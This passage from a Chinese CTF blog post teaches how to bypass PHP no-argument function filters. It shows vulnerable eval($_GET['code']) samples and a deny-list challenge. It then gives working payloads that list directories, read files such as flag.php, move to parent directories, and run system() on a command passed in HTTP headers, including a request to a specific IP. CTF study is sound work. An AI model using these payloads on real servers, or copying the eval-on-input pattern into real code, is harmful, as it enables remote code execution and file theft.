+<span class="token keyword">echo</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>D:\phpStudy\PHPTutorial\WWW<br>D:\phpStudy\PHPTutorial\WWW\app<br>D:\phpStudy\PHPTutorial\WWW</p>
+</blockquote>
+<h3 id="localtime"><a href="#localtime" class="headerlink" title="localtime()"></a>localtime()</h3><pre class="line-numbers language-none"><code class="language-none">localtime(timestamp,is_assoc);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>timestamp</em></td>
+<td align="left">可选。规定 Unix 时间戳。如果未规定 <em>timestamp</em>，则默认为当前的本地时间 time()。</td>
+</tr>
+<tr>
+<td align="left"><em>is_assoc</em></td>
+<td align="left">可选。规定返回关联数组还是索引数组。如果为 FALSE，则返回索引数组。如果为 TRUE，则返回关联数组。默认为 FALSE。关联数组的键名如下：[tm_sec] - 秒数[tm_min] - 分钟数[tm_hour] - 小时[tm_mday] - 月份中的第几天[tm_mon] - 年份中的第几个月，从 0 开始表示一月份[tm_year] - 年份，从 1900 开始[tm_wday] - 星期中的第几天 (Sunday=0)[tm_yday] - 年中的第几天[tm_isdst] - 夏令时当前是否生效</td>
+</tr>
+</tbody></table>
+<br>
+
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/07/19/UfZFsK.png"></p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>可以利用<code>eval()</code>读取目录</p>
+<ul>
+<li>用scandir()读取目录源码，但必须带有参数（’.’），无法通过正则匹配</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/07/20/UflsPO.png"></p>
+<ul>
+<li>用pos()取localeconv()返回的数组的第一个元素，也就是”.”</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/07/20/Ufloi8.png"></p>
+<p><code>code.php?code=var_dump(scandir(pos(localeconv())));</code></p>
+<p><img src="https://s1.ax1x.com/2020/07/20/Uflvd0.png"></p>
+<ul>
+<li>用end()选择最后一个文件并用readfile()读取</li>
+</ul>
+<p><code>code.php?code=var_dump(readfile(end(scandir(pos(localeconv())))));</code></p>
+<blockquote>
+<p>readfile()   输出一个文件</p>
+<p>show_source() 与 echo(readfile())效果一样，可代替使用。</p>
+</blockquote>
+<p><img src="https://s1.ax1x.com/2020/07/20/Uf1kLR.png"></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>利用当前秒数构造点  ，利用localtime()中返回的秒数来构造点，点的aiisc码正好是46在60秒之内，我们只需等到46秒时候就能将点给构造出来。</p>
+<ul>
+<li>chr(current(localtime(time())))</li>
+</ul>
+<p>利用chr(46)就是字符<code>.</code></p>
+<p>数组第一个值每秒+1，所以最多60秒就一定能得到46</p>
+<pre class="line-numbers language-none"><code class="language-none">var_dump(chr(pos(localtime())));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最终payload</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;39.107.126.173:8080&#x2F;code&#x2F;code.php? code&#x3D;var_dump(readfile(end(scandir(chr(pos(localtime()))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>利用SESSIONID来传参</p>
+<pre class="line-numbers language-none"><code class="language-none">show_source(session_id(session_start()));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在cookie处传参</p>
+<pre class="line-numbers language-none"><code class="language-none">PHPSESSID&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/07/20/Uf1UfS.png"></p>
+<p><img src="https://s1.ax1x.com/2020/07/20/U4hJsS.png"></p>
+<h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h3><p>利用 getallheaders() 来获取参数RCE</p>
+<pre class="line-numbers language-none"><code class="language-none">echo(system(end(getallheaders()))); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在最后在最后一条请求头添加</p>
+<pre class="line-numbers language-none"><code class="language-none">cat flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/08/17/dZ78KO.png"></p>
+<br>
+
+<h2 id="读取目录文件"><a href="#读取目录文件" class="headerlink" title="读取目录文件"></a>读取目录文件</h2><ul>
+<li>如果文件是最后一个，可以用</li>
+</ul>
+<p><code>show_source(end(scandir(getcwd())));</code></p>
+<blockquote>
+<p>或者用<code>readfile()</code>、<code>highlight_file()</code>、<code>file_get_contents()</code>、<code>readgzfile()</code>等读文件函数</p>
+</blockquote>
+<ul>
+<li>如果文件是倒数第二个，可以用</li>
+</ul>
+<p><code>show_source(next(array_reverse(scandir(getcwd()))));</code></p>
+<blockquote>
+<p><code>array_reverse()</code>以相反的元素顺序返回数组</p>
+</blockquote>
+<ul>
+<li>如果不是数组的最后一个或者倒数第二个，可以用</li>
+</ul>
+<p><code>show_source(array_rand(array_flip(scandir(getcwd()))));</code></p>
+<p>或者：</p>
+<p><code>show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
+<blockquote>
+<p><code>array_flip()</code>函数会交换数组的键名和键值，<code>array_rand()</code>函数会返回数组中的随机键名</p>
+</blockquote>
+<br>
+
+<h2 id="跳转目录情况"><a href="#跳转目录情况" class="headerlink" title="跳转目录情况"></a>跳转目录情况</h2><ul>
+<li><p>假设ﬂag在上层目录文件的情况，我们需要跳转到上层目录。 </p>
+</li>
+<li><p><code>chdir()</code> 函数当参数为两个点的时候能够跳转到上层目录。<code>scandir()</code> ，读取当前目录在第二个元素就能读取两个点</p>
+</li>
+<li><p><code>localtime</code>第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳 </p>
+</li>
+<li><p>构造读取上层目录payload</p>
+</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>构造读取上层目录文件payload</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<br>
+
+<h2 id="其它小技巧"><a href="#其它小技巧" class="headerlink" title="其它小技巧"></a>其它小技巧</h2><ul>
+<li>利用chr(46)就是字符<code>.</code></li>
+</ul>
+<p>phpversion()会返回php版本，如<code>5.6.27</code></p>
+<p><code>floor(phpversion())</code>返回<code>5</code></p>
+<p><code>sqrt(floor(phpversion()))</code>返回<code>2.2360679774998</code></p>
+<p><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></p>
+<p><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></p>
+<p><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></p>
+<p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></p>
+<p>即：<code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>等于<code>.</code></p>
+<ul>
+<li>利用三角函数构造斜杠</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>利用随机令牌构造点</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">echo(implode(scandir(chr(strrev(uniqid())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>查看上一级目录文件名</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">print_r(scandir(dirname(getcwd())));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">print_r(scandir(next(scandir(getcwd()))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<br>
+
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//flag in flag.php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$a="</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>首先对传进来的code进行过滤，若是通过替换后为<code>;</code>，则能通过第一个if判断语句，所以要套娃嵌套</p>
+<p>第二个if语句对危险函数进行过滤，包括大小写，所以只能用没被过滤的函数来构造payload</p>
+<p>eval()语句执行传进来的code，然后赋值给<code>$a</code></p>
+<p>第三个if语句对$a进行匹配，如果含有<code>flag</code>，则die掉</p>
+<p>绕过了前面3个if语句，则通过echo($a)，将code执行后的结果输出</p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>用<code>file_get_contents()</code>将整个文件读入一个字符串，利用eval()赋值给$a，最后通过echo()打印出来</p>
+<p>因为不知道flag.php的位置，且过滤掉很多函数，如：end()、next()等</p>
+<p>所以用<code>array_rand(array_flip())</code>来获取一个随机的文件名</p>
+<p>合起来就是</p>
+<pre class="line-numbers language-none"><code class="language-none">file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但后边对$a进行正则匹配，过滤了<code>flag</code>，所以要对读取的文件内容加密，由于过滤了base64，所以选择用十六进制加密，得到最终payload</p>
+<pre class="line-numbers language-none"><code class="language-none">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>因为是随机读取，所以要多刷新几次，然后解密看看</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"3c3f7068700d0a2f2f666c61677b36643633333362392d353564302d343266312d613236642d3663666439663361666238657d0d0a3f3e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<blockquote>
+<?php
+//flag{6d6333b9-55d0-42f1-a26d-6cfd9f3afb8e}
+?>
+</blockquote>
+
+                
+            </div>
+            <hr/>
+
+            
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/me_zfb.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/me_wx.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/20201222.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/27.jpg" class="responsive-img" alt="复现3道misc题">
+                        
+                        <span class="card-title">复现3道misc题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            CISCN2020 &amp; 安洵杯2019 &amp; SWPUCTF2020
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-22
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/20201122.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="第四届HECTF write up">
+                        
+                        <span class="card-title">第四届HECTF write up</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            web &amp; misc &amp; 复现
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/writeup/">
+                        <span class="chip bg-color">writeup</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right" id="mycss-footer-center">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2020-2021</span>
+            
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">flag2020</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">30.5k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "10";
+                    var startDate = "8";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
